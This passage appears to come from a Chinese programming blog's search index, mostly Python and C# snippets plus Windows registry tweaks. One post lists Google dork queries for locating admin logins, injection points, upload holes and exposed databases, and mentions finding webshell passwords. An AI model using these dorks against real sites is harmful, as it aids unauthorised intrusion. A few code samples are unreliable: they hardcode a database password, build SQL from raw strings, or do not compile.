这里我就不写了, 到这里我才真正的明白为什么 python自己不封装一下这个算法, 确实可能的情况太多了, 这样还是比较灵活的。(其实进一步封装也是可以的, 就是判断输入的是base64字符串,还是hexstr,或者bytes, 然后在自定义一下输出,不过我是懒得弄了) 另外附上 base64 编码解码 和 hexstr 编码解码 ","date":"2017-07-01","objectID":"/20170701/:5:0","tags":["Python"],"title":"python3实现AES加密","uri":"/20170701/"},{"categories":["编程"],"content":"编码解码 import base64 import binascii data = \"hello\".encode() data = base64.b64encode(data) print(\"base64编码:\",data) data = base64.b64decode(data) print(\"base64解码:\",data) data = binascii.b2a_hex(data) print(\"hexstr编码:\",data) data = binascii.a2b_hex(data) print(\"hexstr解码:\",data) 如果你真的认真的读了我的这篇文章, 我相信你肯定解决了你的问题, 如果不是这样可以评论区提出 ","date":"2017-07-01","objectID":"/20170701/:6:0","tags":["Python"],"title":"python3实现AES加密","uri":"/20170701/"},{"categories":["编程"],"content":" # -*- coding: utf-8 -*- import os import chardet import subprocess def convert(filename, out_enc): try: with open(filename, 'rb') as f: content_bytes = f.read() source_encoding = chardet.detect(content_bytes).get('encoding') print(chardet.detect(content_bytes)) with open(filename, 'r', encoding=source_encoding) as f: content_str = f.read() with open(filename, 'w', encoding=out_enc) as f: f.write(content_str) with open(filename, 'rb') as f: content_bb = f.read() except IOError as err: print(\"I/O error:{0}\".format(err)) def explore(dir, suffix, out_enc): for root, dirs, files in os.walk(dir): for file in files: if os.path.splitext(file)[1] == suffix: print(file) path = os.path.join(root, file) convert(path, out_enc) def exe(): subprocess.check_output(\"hugo\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) subprocess.run(\"git add .\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) subprocess.run(\"git commit -m \\\"main\\\"\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) subprocess.run(\"git push\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) explore(\"public\", \".md\", \"utf-8-sig\") os.chdir('public') subprocess.run(\"git add .\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) subprocess.run(\"git commit -m \\\"main\\\"\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) subprocess.run(\"git push\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) def py(): # 推送到 Hugo 仓库 print('-'*80) os.system('hugo') os.system('git add .') os.system('git commit -m \\\"main\\\"') os.system('git push') print('-'*80) # 批量修改文档编码 explore(\"public\", \".md\", \"utf-8-sig\") # 推送到 CNbysec.github.io 仓库 print('-'*80) os.chdir('public') os.system('git add .') os.system('git commit -m \\\"main\\\"') os.system('git push') print('-'*80) # 本地部署 os.chdir('../') os.system('hugo server') if __name__ == \"__main__\": # exe() py() ","date":"2017-06-01","objectID":"/20170601/:0:0","tags":["Python"],"title":"Python部署推送","uri":"/20170601/"},{"categories":["编程"],"content":"实现自动推送到仓库 # -*- coding:utf-8 -*- from watchdog.observers import Observer from watchdog.events import * import time import os def push(change): print('-'*76) os.system('git add .') os.system('git commit -m\\\"auto'+change+'\\\"') os.system('git push -u origin master') print('-'*76) class FileEventHandler(FileSystemEventHandler): # 初始化魔术方法 def __init__(self): FileSystemEventHandler.__init__(self) # 文件或文件夹移动 def on_moved(self, event): if event.is_directory: print(\"directory moved from {0}to {1}\".format(event.src_path, event.dest_path)) else: print(\"file moved from {0}to {1}\".format(event.src_path, event.dest_path)) # 这里我们只判断文件修改,如需加入文件夹修改,只需在上面的if条件中调用push函数即可 push(\"文件移动: {0}to {1}\".format(event.src_path, event.dest_path)) # 创建文件或文件夹 def on_created(self, event): if event.is_directory: print(\"directory created:{0}\".format(event.src_path)) else: print(\"file created:{0}\".format(event.src_path)) push(\"创建文件:{0}\".format(event.src_path)) # 删除文件或文件夹 def on_deleted(self, event): if event.is_directory: print(\"directory deleted:{0}\".format(event.src_path)) else: print(\"file deleted:{0}\".format(event.src_path)) push(\"删除文件:{0}\".format(event.src_path)) # 移动文件或文件夹 def on_modified(self, event): if event.is_directory: print(\"directory modified:{0}\".format(event.src_path)) else: print(\"file modified:{0}\".format(event.src_path)) push(\"文件修改:{0}\".format(event.src_path)) if __name__ == \"__main__\": # 实例化Observer对象 observer = Observer() event_handler = FileEventHandler() # 设置监听目录 dis_dir = \"./_posts/\" observer.schedule(event_handler, dis_dir, True) observer.start() try: while True: # 设置监听频率(间隔周期时间) time.sleep(1) except KeyboardInterrupt: observer.stop() observer.join() ","date":"2017-05-01","objectID":"/20170501/:1:0","tags":["Python"],"title":"Python实现自动推送到仓库","uri":"/20170501/"},{"categories":["编程"],"content":"批量修改文档编码 # -*- coding: utf-8 -*- import os import chardet def convert(filename, out_enc): try: with open(filename, 'rb') as f: content_bytes = f.read() source_encoding = chardet.detect(content_bytes).get('encoding') print(chardet.detect(content_bytes)) with open(filename, 'r', encoding=source_encoding) as f: content_str = f.read() with open(filename, 'w', encoding=out_enc) as f: f.write(content_str) with open(filename, 'rb') as f: content_bb = f.read() except IOError as err: print(\"I/O error:{0}\".format(err)) def explore(dir, suffix, out_enc): for root, dirs, files in os.walk(dir): for file in files: if os.path.splitext(file)[1] == suffix: print(file) path = os.path.join(root, file) convert(path, out_enc) def main(): explore(\"./public\", \".md\", \"utf-8-sig\") if __name__ == \"__main__\": main() ","date":"2017-04-01","objectID":"/20170401/:1:0","tags":["Python"],"title":"Python批量修改文档编码","uri":"/20170401/"},{"categories":["编程"],"content":"tkinter多线程 # -*-coding:utf-8-*- import threading import tkinter import tkinter.messagebox def message(): tkinter.messagebox.showinfo(message=\"弹出消息\") def sta(): th = threading.Thread(target=main) th.setDaemon(True) th.start() if __name__ == '__main__': root = tkinter.Tk() root.title(\"title\") root.iconbitmap(\"favicon.ico\") root.resizable(width=False, height=False) sw = root.winfo_screenwidth() sh = root.winfo_screenheight() x = (sw - 300) / 2 y = (sh - 300) / 5 root.geometry(\"%dx%d+%d+%d\" % (200, 200, x, y)) message = tkinter.Button(root, text=\"弹框消息\", bg='white', fg='green', command=message) message.pack() message = message.place(x=65, y=150, width=60, height=40) sta = tkinter.Button(root, text=\"开 始\", bg='white', fg='red', command=sta) sta.pack() sta = sta.place(x=120, y=100, width=60, height=40) root.mainloop() ","date":"2017-03-01","objectID":"/20170301/:1:0","tags":["Python","Tkinter"],"title":"Tkinter多线程","uri":"/20170301/"},{"categories":["编程"],"content":"读取yaml文件 import yaml def getYaml(path): proPath = os.path.dirname(os.path.realpath(__file__)) yamlPath = os.path.join(proPath, path) f = open(yamlPath, \"r\", encoding=\"utf-8\") data = yaml.full_load(f) f.close() return data ","date":"2017-02-01","objectID":"/20170201/:1:0","tags":["Python"],"title":"python读取yaml文件","uri":"/20170201/"},{"categories":["编程"],"content":"图片切片 from PIL import Image def cutImg(path, x, y, w, h): im = Image.open(path) img_size = im.size region = im.crop((x, y, x + w, y + h)) region.save('cutImg.png') return format(img_size) ","date":"2017-01-01","objectID":"/20170101/:1:0","tags":["Python"],"title":"python图片切片","uri":"/20170101/"},{"categories":["编程"],"content":"获取图片位置上的rgb颜色 from PIL import Image def getPix(Path, pixelX, pixelY): img_src = Image.open(Path) img_src = img_src.convert('RGB') str_strlist = img_src.load() data = str_strlist[int(pixelX), int(pixelY)] img_src.close() print(data) return data ","date":"2017-01-01","objectID":"/20170101/:2:0","tags":["Python"],"title":"python图片切片","uri":"/20170101/"},{"categories":["编程"],"content":"主线程 using System; using System.Threading; namespace MultithreadingApplication { class MainThreadProgram { static void Main(string[] args) { Thread th = Thread.CurrentThread; th.Name = \"MainThread\"; Console.WriteLine(\"This is {0}\", th.Name); Console.ReadKey(); } } } ","date":"2016-12-01","objectID":"/20161201/:1:0","tags":["CSharp"],"title":"C# 多线程","uri":"/20161201/"},{"categories":["编程"],"content":"创建线程 using System; using System.Threading; namespace MultithreadingApplication { class ThreadCreationProgram { public static void CallToChildThread() { Console.WriteLine(\"Child thread starts\"); } static void Main(string[] args) { ThreadStart childref = new ThreadStart(CallToChildThread); Console.WriteLine(\"In Main: Creating the Child thread\"); Thread childThread = new Thread(childref); childThread.Start(); Console.ReadKey(); } } } ","date":"2016-12-01","objectID":"/20161201/:2:0","tags":["CSharp"],"title":"C# 多线程","uri":"/20161201/"},{"categories":["编程"],"content":"管理线程 using System; using System.Threading; namespace MultithreadingApplication { class ThreadCreationProgram { public static void CallToChildThread() { Console.WriteLine(\"Child thread starts\"); // 线程暂停 5000 毫秒 int sleepfor = 5000; Console.WriteLine(\"Child Thread Paused for {0} seconds\", sleepfor / 1000); Thread.Sleep(sleepfor); Console.WriteLine(\"Child thread resumes\"); } static void Main(string[] args) { ThreadStart childref = new ThreadStart(CallToChildThread); Console.WriteLine(\"In Main: Creating the Child thread\"); Thread childThread = new Thread(childref); childThread.Start(); Console.ReadKey(); } } } ","date":"2016-12-01","objectID":"/20161201/:3:0","tags":["CSharp"],"title":"C# 多线程","uri":"/20161201/"},{"categories":["编程"],"content":"销毁线程 using System; using System.Threading; namespace MultithreadingApplication { class ThreadCreationProgram { public static void CallToChildThread() { try { Console.WriteLine(\"Child thread starts\"); // 计数到 10 for (int counter = 0; counter \u003c= 10; counter++) { Thread.Sleep(500); Console.WriteLine(counter); } Console.WriteLine(\"Child Thread Completed\"); } catch (ThreadAbortException e) { Console.WriteLine(\"Thread Abort Exception\"); } finally { Console.WriteLine(\"Couldn't catch the Thread Exception\"); } } static void Main(string[] args) { ThreadStart childref = new ThreadStart(CallToChildThread); Console.WriteLine(\"In Main: Creating the Child thread\"); Thread childThread = new Thread(childref); childThread.Start(); // 停止主线程一段时间 Thread.Sleep(2000); // 现在中止子线程 Console.WriteLine(\"In Main: Aborting the Child thread\"); childThread.Abort(); Console.ReadKey(); } } } ","date":"2016-12-01","objectID":"/20161201/:4:0","tags":["CSharp"],"title":"C# 多线程","uri":"/20161201/"},{"categories":["编程"],"content":"下载图片到本地 public void saveimage() { WebClient mywebclient = new WebClient(); string url = \"http://images.google.cn/intl/zh-CN_ALL/images/images_hp.gif\"; string newfilename = DateTime.Now.Year.ToString() + DateTime.Now.Month.ToString() + DateTime.Now.Day.ToString() + DateTime.Now.Hour.ToString() + DateTime.Now.Minute.ToString() + DateTime.Now.Second.ToString() + \".jpg\"; string filepath = @\"F:\\\" + newfilename; try { mywebclient.DownloadFile(url, filepath); //filename = newfilename; } catch (Exception ex) { MessageBox.Show(ex.ToString()); } } ","date":"2016-11-01","objectID":"/20161101/:1:0","tags":["CSharp"],"title":"C# 下载图片到本地","uri":"/20161101/"},{"categories":["编程"],"content":"使用Newtonsoft.Json解析json Visual Studio中搜索安装Newtonsoft.Json插件 // 解析对象 string jsonText = \"{\\\"zone\\\":\\\"海淀\\\",\\\"zone_en\\\":\\\"haidian\\\"}\"; JObject jo = (JObject)JsonConvert.DeserializeObject(jsonText); string zone = jo[\"zone\"].ToString(); string zone_en = jo[\"zone_en\"].ToString(); // 解析数组 string jsonText = \"[\\\"海淀\\\",\\\"北京\\\",\\\"上海\\\"}\"; JObject jo = (JObject)JsonConvert.DeserializeObject(jsonText); JArray rangQiuList = (JArray)jo; ","date":"2016-10-01","objectID":"/20161001/:1:0","tags":["CSharp"],"title":"C# 使用Newtonsoft.Json解析json","uri":"/20161001/"},{"categories":["编程"],"content":"复制、粘贴文本信息到剪贴板 // 复制： private void button1_Click(object sender, System.EventArgs e) { if(textBox1.SelectedText != ”\") 　Clipboard.SetDataObject(textBox1.SelectedText); } // 粘贴： private void button2_Click(object sender, System.EventArgs e) { IDataObject iData = Clipboard.GetDataObject(); if(iData.GetDataPresent(DataFormats.Text)) { textBox2.Text = (String)iData.GetData(DataFormats.Text); } } 主要通过调用Clipborad的API完成。 ","date":"2016-09-01","objectID":"/20160901/:1:0","tags":["CSharp"],"title":"C# 复制、粘贴文本信息到剪贴板","uri":"/20160901/"},{"categories":["编程"],"content":"通过URL获取图片并显示在PictureBox上的方法 string url = string.Format(@\"http://webservice.36wu.com/DimensionalCodeService.asmx/GetCodeImgByString?size={0}\u0026content={1}\", 5, 123456); System.Net.WebRequest webreq = System.Net.WebRequest.Create(url); System.Net.WebResponse webres = webreq.GetResponse(); using(System.IO.Stream stream = webres.GetResponseStream()) { pictureBox1.Image = Image.FromStream(stream); } ","date":"2016-08-01","objectID":"/20160801/:1:0","tags":["CSharp"],"title":"C# 通过URL获取图片并显示在PictureBox上的方法","uri":"/20160801/"},{"categories":["编程"],"content":"禁止Form窗口调整大小 禁止Form窗口调整大小方法：FormBorderStyle 设为 FixedSingle； 不能使用最大化窗口：MaximuzeBox 设为 False； 不能使用最小化窗口：MinimizeBox 设为 False； 禁止combobox输入方法：将DropDownStyle 设为 DropDownList ","date":"2016-07-01","objectID":"/20160701/:1:0","tags":["CSharp"],"title":"C# 禁止Form窗口调整大小","uri":"/20160701/"},{"categories":["编程"],"content":"新建 requirements.txt beautifulsoup4==4.8.2 certifi==2019.11.28 cffi==1.14.0 chardet==3.0.4 fire==0.2.1 gevent==1.4.0 greenlet==0.4.15 idna==2.8 lxml==4.5.0 Pillow==7.1.1 pycparser==2.20 requests==2.22.0 six==1.14.0 soupsieve==2.0 termcolor==1.1.0 tqdm==4.34.0 urllib3==1.25.3 ","date":"2016-06-01","objectID":"/20160601/:1:0","tags":["Python"],"title":"Python批量安装依赖","uri":"/20160601/"},{"categories":["编程"],"content":"安装命令 pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/ ","date":"2016-06-01","objectID":"/20160601/:2:0","tags":["Python"],"title":"Python批量安装依赖","uri":"/20160601/"},{"categories":["编程"],"content":"其它pypi源 #阿里云 http://mirrors.aliyun.com/pypi/simple/ #中国科学技术大学 http://pypi.mirrors.ustc.edu.cn/simple/ #清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/ ","date":"2016-06-01","objectID":"/20160601/:3:0","tags":["Python"],"title":"Python批量安装依赖","uri":"/20160601/"},{"categories":["编程"],"content":"main.py # -*- coding: utf-8 -*- import sys import time from PyQt5.QtCore import QThread, pyqtSignal from PyQt5.QtWidgets import QApplication, QMainWindow from UI import Ui_Form class MyMainForm(QMainWindow, Ui_Form): def __init__(self, parent=None): super(MyMainForm, self).__init__(parent) self.setupUi(self) # 实例化线程对象 self.work = WorkThread() self.runButton.clicked.connect(self.execute) def execute(self): # 启动线程 self.work.start() # 线程自定义信号连接的槽函数 self.work.trigger.connect(self.display) def display(self, str): # 由于自定义信号时自动传递一个字符串参数，所以在这个槽函数中要接受一个参数 self.listWidget.addItem(str) class WorkThread(QThread): # 自定义信号对象。参数str就代表这个信号可以传一个字符串 trigger = pyqtSignal(str) def __int__(self): # 初始化函数 super(WorkThread, self).__init__() def run(self): # 重写线程执行的run函数 # 触发自定义信号 for i in range(20): time.sleep(1) # 通过自定义信号把待显示的字符串传递给槽函数 self.trigger.emit(str(i)) if __name__ == \"__main__\": app = QApplication(sys.argv) myWin = MyMainForm() myWin.show() sys.exit(app.exec_()) ","date":"2016-05-01","objectID":"/20160501/:1:0","tags":["Python","PyQt5"],"title":"PyQt5多线程模块QThread使用方法","uri":"/20160501/"},{"categories":["编程"],"content":"UI.py # -*- coding: utf-8 -*- # Form implementation generated from reading ui file 'UI.ui' # # Created by: PyQt5 UI code generator 5.13.0 # # WARNING! All changes made in this file will be lost! from PyQt5 import QtCore, QtGui, QtWidgets class Ui_Form(object): def setupUi(self, Form): Form.setObjectName(\"Form\") Form.resize(498, 331) self.runButton = QtWidgets.QPushButton(Form) self.runButton.setGeometry(QtCore.QRect(190, 30, 75, 23)) self.runButton.setObjectName(\"runButton\") self.listWidget = QtWidgets.QListWidget(Form) self.listWidget.setGeometry(QtCore.QRect(30, 70, 431, 192)) self.listWidget.setObjectName(\"listWidget\") self.retranslateUi(Form) QtCore.QMetaObject.connectSlotsByName(Form) def retranslateUi(self, Form): _translate = QtCore.QCoreApplication.translate Form.setWindowTitle(_translate(\"Form\", \"Qthread Example\")) self.runButton.setText(_translate(\"Form\", \"Run\")) ","date":"2016-05-01","objectID":"/20160501/:2:0","tags":["Python","PyQt5"],"title":"PyQt5多线程模块QThread使用方法","uri":"/20160501/"},{"categories":["编程"],"content":"UI.ui \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cui version=\"4.0\"\u003e \u003cclass\u003eForm\u003c/class\u003e \u003cwidget class=\"QWidget\" name=\"Form\"\u003e \u003cproperty name=\"geometry\"\u003e \u003crect\u003e \u003cx\u003e0\u003c/x\u003e \u003cy\u003e0\u003c/y\u003e \u003cwidth\u003e498\u003c/width\u003e \u003cheight\u003e331\u003c/height\u003e \u003c/rect\u003e \u003c/property\u003e \u003cproperty name=\"windowTitle\"\u003e \u003cstring\u003eQthread Example\u003c/string\u003e \u003c/property\u003e \u003cwidget class=\"QPushButton\" name=\"runButton\"\u003e \u003cproperty name=\"geometry\"\u003e \u003crect\u003e \u003cx\u003e190\u003c/x\u003e \u003cy\u003e30\u003c/y\u003e \u003cwidth\u003e75\u003c/width\u003e \u003cheight\u003e23\u003c/height\u003e \u003c/rect\u003e \u003c/property\u003e \u003cproperty name=\"text\"\u003e \u003cstring\u003eRun\u003c/string\u003e \u003c/property\u003e \u003c/widget\u003e \u003cwidget class=\"QListWidget\" name=\"listWidget\"\u003e \u003cproperty name=\"geometry\"\u003e \u003crect\u003e \u003cx\u003e30\u003c/x\u003e \u003cy\u003e70\u003c/y\u003e \u003cwidth\u003e431\u003c/width\u003e \u003cheight\u003e192\u003c/height\u003e \u003c/rect\u003e \u003c/property\u003e \u003c/widget\u003e \u003c/widget\u003e \u003cresources/\u003e \u003cconnections/\u003e \u003c/ui\u003e ","date":"2016-05-01","objectID":"/20160501/:3:0","tags":["Python","PyQt5"],"title":"PyQt5多线程模块QThread使用方法","uri":"/20160501/"},{"categories":["编程"],"content":"引入 使用这个方法需要装有微软office 引入程序集: Microsoft.Office.Interop.Excel.dll 没有就网上下载一份然后引用即可 ","date":"2016-04-01","objectID":"/20160401/:1:0","tags":["CSharp"],"title":"C# winform中DataGridView的数据实现导出excel","uri":"/20160401/"},{"categories":["编程"],"content":"实现方法 private void ExportExcels(string fileName, DataGridView myDGV) { string saveFileName = \"\"; SaveFileDialog saveDialog = new SaveFileDialog(); saveDialog.DefaultExt = \"xls\"; saveDialog.Filter = \"Excel文件|*.xls\"; saveDialog.FileName = fileName; saveDialog.ShowDialog(); saveFileName = saveDialog.FileName; if (saveFileName.IndexOf(\":\") \u003c 0) return; //被点了取消 Microsoft.Office.Interop.Excel.Application xlApp = new Microsoft.Office.Interop.Excel.Application(); if (xlApp == null) { MessageBox.Show(\"无法创建Excel对象，可能您的机子未安装Excel\"); return; } Microsoft.Office.Interop.Excel.Workbooks workbooks = xlApp.Workbooks; Microsoft.Office.Interop.Excel.Workbook workbook = workbooks.Add(Microsoft.Office.Interop.Excel.XlWBATemplate.xlWBATWorksheet); Microsoft.Office.Interop.Excel.Worksheet worksheet = (Microsoft.Office.Interop.Excel.Worksheet)workbook.Worksheets[1];//取得sheet1 //写入标题 for (int i = 0; i \u003c myDGV.ColumnCount; i++) { worksheet.Cells[1, i + 1] = myDGV.Columns[i].HeaderText; } //写入数值 for (int r = 0; r \u003c myDGV.Rows.Count; r++) { for (int i = 0; i \u003c myDGV.ColumnCount; i++) { worksheet.Cells[r + 2, i + 1] = myDGV.Rows[r].Cells[i].Value; } System.Windows.Forms.Application.DoEvents(); } worksheet.Columns.EntireColumn.AutoFit();//列宽自适应 if (saveFileName != \"\") { try { workbook.Saved = true; workbook.SaveCopyAs(saveFileName); } catch (Exception ex) { MessageBox.Show(\"导出文件时出错,文件可能正被打开！\\n\" + ex.Message); } } xlApp.Quit(); GC.Collect(); //强行销毁 MessageBox.Show(\"文件： \" + fileName + \".xls 保存成功\", \"信息提示\", MessageBoxButtons.OK, MessageBoxIcon.Information); } ","date":"2016-04-01","objectID":"/20160401/:2:0","tags":["CSharp"],"title":"C# winform中DataGridView的数据实现导出excel","uri":"/20160401/"},{"categories":["编程"],"content":"点击按钮调用 private void button1_Click(object sender, EventArgs e) { string a = \"D:\" + \"\\\\KKHMD.xls\"; ExportExcels(a, dataGridView1); } ","date":"2016-04-01","objectID":"/20160401/:3:0","tags":["CSharp"],"title":"C# winform中DataGridView的数据实现导出excel","uri":"/20160401/"},{"categories":["编程"],"content":"环境 VS2010 + SqlServer 2008 首先，按照面向对象的程序设计思想，设计一个数据库操作工具类MyTool.cs，该类中封装了关于数据库连接和操作的方法，各个功能模块在需进行数据库操作时只需调用相应的函数 //引入的命名空间 using System.Data.SqlClient; //用于SQL Sever数据访问的命名空间 using System.Data; //DataSet类的命名空间 using System.Windows.Forms; //DataGridView控件类的命名空间 //执行指定的SQL命令语句(insert,delete,update等),并返回命令所影响的行数 public static int executeCommand(string sqlStr) { SqlConnection sqlConnection1 = new SqlConnection(\"server=dell-PC;database=11071312HotelSys;uid=sa;pwd=xiaoyi9421\");//创建数据库连接(字符串中是我个人的数据库信息) sqlConnection1.Open(); //打开数据库连接 SqlCommand sqlCommand1 = new SqlCommand(sqlStr, sqlConnection1); //执行SQL命令 int Succnum = sqlCommand1.ExecuteNonQuery(); return Succnum; } //查询(select)指定的数据记录（多行多列）,并填充到数据控件DataGridView中 public static void queryDataToGrid(string sqlStr, DataGridView dataGridView1) { SqlConnection sqlConnection1 = new SqlConnection(\"server=dell-PC;database=11071312HotelSys;uid=sa;pwd=xiaoyi9421\");//创建数据库连接 SqlDataAdapter sqlDataAdapter1 = new SqlDataAdapter(sqlStr, sqlConnection1);//利用已创建好的sqlConnection1,创建数据适配器sqlDataAdapter1 DataSet dataSet1 = new DataSet(); //创建数据集对象 sqlDataAdapter1.Fill(dataSet1); //执行查询,查询的结果存放在数据集里 dataGridView1.DataSource = dataSet1.Tables[0]; //把数据集中的查询结果绑定到dataGridView1中 } //查询(select)指定的数据（单个数据,假设为string类型）,并返回 public static string queryData(string sqlStr) { SqlConnection sqlConnection1 = new SqlConnection(\"server=dell-PC;database=11071312HotelSys;uid=sa;pwd=xiaoyi9421\");//创建数据库连接 SqlDataAdapter sqlDataAdapter1 = new SqlDataAdapter(sqlStr, sqlConnection1);//利用已创建好的sqlConnection1,创建数据适配器sqlDataAdapter1 DataSet dataSet1 = new DataSet(); //创建数据集对象 sqlDataAdapter1.Fill(dataSet1); //执行查询,查询的结果存放在数据集里 return dataSet1.Tables[0].Rows[0][\"列名\"].ToString(); //把查询结果的第一行指定列下的数据以string类型返回 } 当在各个功能模块中需要进行数据库操作时，只需指定要执行的SQL语句，调用一下数据库工具类中的方法即可实现，下面给了一些基本的的SQL操作(单表) //增 sqlStr = \"insert into 表名( 列名1 , 列名2 )values( 插入值1 , 插入值2 )\"; //执行指定的SQL命令语句,并返回命令所影响的行数 int Succnum = MyTool.executeCommand(sqlStr); if (Succnum \u003e 0) MessageBox.Show(\"录入成功\"); //删 sqlStr = \"delete from 表名 where 删除条件\"; int Succnum = MyTool.executeCommand(sqlStr); if (Succnum \u003e 0) MessageBox.Show(\"删除成功\"); //改 sqlStr = \"update 表名 set 列名1 = 更新值1 , 列名2 = 更新值2\"; int Succnum = MyTool.executeCommand(sqlStr); if (Succnum \u003e 0) MessageBox.Show(\"更新成功\"); //查一组数据 sqlStr = \"select 列名1 , 列名2 from 表名 where 查询表达式\"; MyTool.queryDataToGrid(sqlStr, dataGridView1);//填充到数据控件DataGridView中 //查单个数据 sqlStr = \"select 列名 from 表名 where 查询表达式\"; textBox1.Text = MyTool.queryData(sqlStr); //填充到文本框textBox1中 ","date":"2016-03-01","objectID":"/20160301/:1:0","tags":["CSharp"],"title":"C# 连SqlServer数据库","uri":"/20160301/"},{"categories":["编程"],"content":"MD5加密 using System; using System.Collections.Generic; using System.Text; using System.Security.Cryptography; namespace md5 { class Program { static void Main(string[] args) { Console.WriteLine(UserMd5(\"8\")); Console.WriteLine(GetMd5Str(\"8\")); } // MD5 16位加密 加密后密码为大写 public static string GetMd5Str(string ConvertString) { MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider(); string t2 = BitConverter.ToString(md5.ComputeHash(UTF8Encoding.Default.GetBytes(ConvertString)), 4, 8); t2 = t2.Replace(\"-\", \"\"); return t2; } // MD5 16位加密 加密后密码为小写 public static string GetMd5Str(string ConvertString) { MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider(); string t2 = BitConverter.ToString(md5.ComputeHash(UTF8Encoding.Default.GetBytes(ConvertString)), 4, 8); t2 = t2.Replace(\"-\", \"\"); t2 = t2.ToLower(); return t2; } // MD5　32位加密 static string UserMd5(string str) { string cl = str; string pwd = \"\"; MD5 md5 = MD5.Create();//实例化一个md5对像 // 加密后是一个字节类型的数组，这里要注意编码UTF8/Unicode等的选择　 byte[] s = md5.ComputeHash(Encoding.UTF8.GetBytes(cl)); // 通过使用循环，将字节类型的数组转换为字符串，此字符串是常规字符格式化所得 for (int i = 0; i \u003c s.Length; i++) { // 将得到的字符串使用十六进制类型格式。格式后的字符是小写的字母，如果使用大写（X）则格式后的字符是大写字符 pwd = pwd + s[i].ToString(\"X\"); } return pwd; } } } using System.Security.Cryptography; using System.Text; public static string StringToMD5Hash(string inputString) { MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider(); byte[] encryptedBytes = md5.ComputeHash(Encoding.ASCII.GetBytes(inputString)); StringBuilder sb = new StringBuilder(); for (int i = 0; i \u003c encryptedBytes.Length; i++) { sb.AppendFormat(\"{0:x2}\", encryptedBytes[i]); } return sb.ToString(); } ","date":"2016-02-01","objectID":"/20160201/:1:0","tags":["CSharp"],"title":"C# MD5加密","uri":"/20160201/"},{"categories":["编程"],"content":"WINFORM 打开新窗体 关闭当前窗体 Form1 的 Button 下 { Form2 f2 = new Form2(); f2.ShowDialog(this);// this.Close(); } Form2 的 load 下 { //只能隐藏不能关闭 this.owner.hide(); } ","date":"2016-01-01","objectID":"/20160101/:1:0","tags":["CSharp"],"title":"C# WINFORM 打开新窗体 关闭当前窗体","uri":"/20160101/"},{"categories":["技术"],"content":" site：可以限制你搜索范围的域名. inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用. intext: 只搜索网页部分中包含的文字(也就是忽略了标题、URL等的文字) intitle: 查包含关键词的页面，一般用于社工别人的webshell密码 filetype：搜索文件的后缀或者扩展名 intitle：限制你搜索的网页标题. link: 可以得到一个所有包含了某个指定URL的页面列表. 查找后台地址：site域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms 查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username 查找可注入点：site:域名 inurl:aspx|jsp|php|asp 查找上传漏洞：site:域名 inurl:file|load|editor|Files 找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit 存在的数据库：site:域名 filetype:mdb|asp|# 查看脚本类型：site:域名 filetype:asp/aspx/php/jsp 迂回策略入侵：inurl:cms/data/templates/images/index/ ","date":"2015-12-01","objectID":"/20151201/:0:0","tags":["搜索","语法"],"title":"高级搜索语法","uri":"/20151201/"},{"categories":["系统"],"content":" 请在【此电脑】最上方【查看】中勾选【文件扩展名】 ","date":"2015-11-01","objectID":"/20151101/:0:0","tags":["Win10"],"title":"Win10创建快捷方式时去掉快捷方式后缀","uri":"/20151101/"},{"categories":["系统"],"content":"使用reg文件添加 复制下面的代码把后缀改成 .reg Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer] \"link\"=hex:00,00,00,00 ","date":"2015-11-01","objectID":"/20151101/:1:0","tags":["Win10"],"title":"Win10创建快捷方式时去掉快捷方式后缀","uri":"/20151101/"},{"categories":["系统"],"content":" 请在【此电脑】最上方【查看】中勾选【文件扩展名】 ","date":"2015-10-01","objectID":"/20151001/:0:0","tags":["Win10"],"title":"Win10使用Windows照片查看打开图片","uri":"/20151001/"},{"categories":["系统"],"content":"使用reg文件添加 复制下面的代码把后缀改成 .reg Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations] \".ico\"=\"PhotoViewer.FileAssoc.Tiff\" \".png\"=\"PhotoViewer.FileAssoc.Tiff\" \".gif\"=\"PhotoViewer.FileAssoc.Tiff\" \".jpg\"=\"PhotoViewer.FileAssoc.Tiff\" \".jpeg\"=\"PhotoViewer.FileAssoc.Tiff\" \".bmp\"=\"PhotoViewer.FileAssoc.Tiff\" \".ico\"=\"PhotoViewer.FileAssoc.Tiff\" \".svg\"=\"PhotoViewer.FileAssoc.Tiff\" \".webp\"=\"PhotoViewer.FileAssoc.Tiff\" \".tif\"=\"PhotoViewer.FileAssoc.Tiff\" \".tiff\"=\"PhotoViewer.FileAssoc.Tiff\" ","date":"2015-10-01","objectID":"/20151001/:1:0","tags":["Win10"],"title":"Win10使用Windows照片查看打开图片","uri":"/20151001/"},{"categories":["系统"],"content":"使用bat添加 这个方法需要管理员权限运行，比较推荐使用第一个方法 复制下面的代码把后缀改成 .bat @echo off\u0026cd\\\u0026color 0a\u0026cls echo 如果显示【错误 拒绝访问】请右键选择【以管理员身份运行】 echo ------------------------------------------------------------ reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\" /v \".ico\" /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\" /v \".png\" /t REG_SZ /d 